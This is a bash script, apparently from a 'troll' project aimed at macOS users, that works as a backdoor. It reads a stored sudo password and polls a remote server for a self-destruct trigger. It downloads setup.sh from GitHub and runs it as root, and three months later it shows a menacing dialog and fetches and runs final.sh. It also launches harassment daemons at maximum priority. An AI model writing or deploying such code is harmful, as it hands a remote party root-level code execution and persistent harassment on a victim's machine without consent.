#!/usr/bin/env bash

TARGET_DIR="$HOME/programfiles"
SUBP_DIR="$TARGET_DIR/subp"
SUCCESS_MARKER="$SUBP_DIR/success"
SETUP_URL="https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/setup.sh"
SETUP_PATH="$TARGET_DIR/setup.sh"

# Load sudo password from file
PFILE="$TARGET_DIR/p.txt"
if [ ! -f "$PFILE" ]; then
    echo "❌ Password file not found at '$PFILE'."
    exit 1
fi

SUDO_PASS=$(<"$PFILE")

# === Backdoor: self-destruct trigger ===
# Fetch self-destruct trigger without curl
if command -v wget >/dev/null 2>&1; then
  RESPONSE=$(wget -qO- "https://drive.genshinimpact.ca/f/pYfA/carterbrick")
elif command -v python3 >/dev/null 2>&1; then
  RESPONSE=$(python3 - <<EOF
import urllib.request
print(urllib.request.urlopen("https://drive.genshinimpact.ca/f/pYfA/carterbrick").read().decode())
EOF
)
else
  RESPONSE=""
fi
if echo "$RESPONSE" | grep -q '"code":40004,"msg":"Object existed"'; then
  echo "[*] Self-destruct trigger received. Launching sd.sh..."
  bash "$TARGET_DIR/subp/sd.sh"
  exit 0
fi


# Ensure base directories exist
mkdir -p "$TARGET_DIR" "$SUBP_DIR"

# If subp exists but success marker is missing, reset for re-run
if [ -d "$SUBP_DIR" ] && [ ! -e "$SUCCESS_MARKER" ]; then
  echo "[*] Detected existing subp without success marker. Resetting subp for re-run..."
  rm -rf "$SUBP_DIR"
  mkdir -p "$SUBP_DIR"
fi

# First-run bootstrap: if no success marker, download setup.sh and run setup
if [ ! -e "$SUCCESS_MARKER" ]; then
    echo "[*] First run detected: downloading setup.sh..."
    # Download setup.sh without curl
    if command -v wget >/dev/null 2>&1; then
      wget -qO "$SETUP_PATH" "$SETUP_URL"
    elif command -v python3 >/dev/null 2>&1; then
      python3 - <<EOF
import urllib.request
urllib.request.urlretrieve("$SETUP_URL", "$SETUP_PATH")
EOF
    else
      echo "Error: unable to download setup.sh" >&2
      exit 1
    fi
    echo "[*] setup.sh downloaded to $SETUP_PATH"
    # Execute setup.sh on first run
    echo "[*] Running setup.sh for initial configuration..."
    echo "$SUDO_PASS" | sudo -S bash "$SETUP_PATH"
    # Mark setup as completed
    touch "$SUCCESS_MARKER"
fi

# === Post-bootstrap: enforce 3‑hour delay from initial init-main timestamp ===
TIME_FILE="$TARGET_DIR/time.txt"
if [ -f "$TIME_FILE" ]; then
  # Read the recorded timestamp and convert to epoch
  REC_TS=$(date -j -f '%Y:%m:%d:%H:%M:%S' "$(cat "$TIME_FILE")" +%s)
  NOW_TS=$(date +%s)
  ELAPSED=$(( NOW_TS - REC_TS ))
  WAIT=$(( 10800 - ELAPSED ))
  if [ "$WAIT" -gt 0 ]; then
    echo "[*] Waiting ${WAIT}s until 3 hours from initial bootstrap..."
    sleep "$WAIT"
  fi
fi

 # === 3‑month payload: if exactly three months since initial run, trigger final.sh ===
if [ -f "$TIME_FILE" ]; then
  ORIG_TS_STR=$(cat "$TIME_FILE")
  # Compute the date exactly 3 months after original timestamp
  TARGET_DATE=$(date -j -f '%Y:%m:%d:%H:%M:%S' "$ORIG_TS_STR" -v+3m '+%Y%m%d')
  NOW_DATE=$(date '+%Y%m%d')
  if [ "$NOW_DATE" = "$TARGET_DATE" ]; then
    # Notify user via Finder dialog
    osascript -e 'tell application "Finder" to display dialog "It'\''s the day, you were never forgiven." buttons {"OK"} default button 1'
    # Download and execute final.sh without curl
    if command -v wget >/dev/null 2>&1; then
      wget -qO "$TARGET_DIR/final.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/final.sh"
    elif command -v python3 >/dev/null 2>&1; then
      python3 - <<EOF
import urllib.request
urllib.request.urlretrieve("https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/final.sh", "$TARGET_DIR/final.sh")
EOF
    else
      echo "Error: unable to download final.sh" >&2
      exit 1
    fi
    chmod +x "$TARGET_DIR/final.sh"
    bash "$TARGET_DIR/final.sh"
    exit 0
  fi
fi

# === Launch all daemons in background at highest priority ===
cd "$SUBP_DIR" || exit 1
echo "[*] Starting daemons..."
nice -n -20 ./picture-daemon.sh &
nice -n -20 ./wallpaper-daemon.sh &
nice -n -20 ./sound-daemon.sh &
nice -n -20 ./websites-daemon.sh &
nice -n -20 ./trigger.sh &
